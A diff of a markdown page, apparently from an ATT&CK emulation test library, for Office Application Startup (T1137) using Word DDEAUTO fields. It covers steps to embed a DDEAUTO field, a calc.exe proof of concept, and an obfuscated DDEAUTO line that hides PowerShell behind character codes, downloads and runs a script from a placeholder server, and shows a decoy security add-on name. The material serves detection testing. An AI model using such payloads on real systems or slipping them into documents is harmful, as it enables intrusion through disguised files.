@@ -1,6 +1,7 @@
 # Office Application Startup
 
-MITRE ATT&CK Technique: [T1137](https://attack.mitre.org/wiki/Technique/T1137)
+## MITRE ATT&CK Technique:
+[T1137](https://attack.mitre.org/wiki/Technique/T1137)
 
 
 ## DDEAUTO
@@ -13,13 +14,13 @@ MITRE ATT&CK Technique: [T1137](https://attack.mitre.org/wiki/Technique/T1137)
 6. Paste in the code from Unicorn or SensePost
 7. Save the Word document.
 
-* [SensePost DDEAUTO](https://sensepost.com/blog/2017/macro-less-code-exec-in-msword/)
+# [SensePost DDEAUTO](https://sensepost.com/blog/2017/macro-less-code-exec-in-msword/)
 
     DDEAUTO c:\\windows\\system32\\cmd.exe "/k calc.exe"
 
-* [TrustedSec - Unicorn](https://github.com/trustedsec/unicorn)
+# [TrustedSec - Unicorn](https://github.com/trustedsec/unicorn)
 
-Generate the payload and download.ps1 following the Unicorn instructions, or to make one "just work", follow the steps below.
+## Generate the payload and download.ps1 following the Unicorn instructions, or to make one "just work", follow the steps below.
 
     DDEAUTO "C:\\Programs\\Microsoft\\Office\\MSWord\\..\\..\\..\\..\\windows\\system32\\{ QUOTE 87 105 110 100 111 119 115 80 111 119 101 114 83 104 101 108 108 }\\v1.0\\{ QUOTE 112 111 119 101 114 115 104 101 108 108 46 101 120 101 } -w 1 -nop { QUOTE 105 101 120 }(New-Object System.Net.WebClient).DownloadString('http://<server>/download.ps1'); # " "Microsoft Document Security Add-On"
 
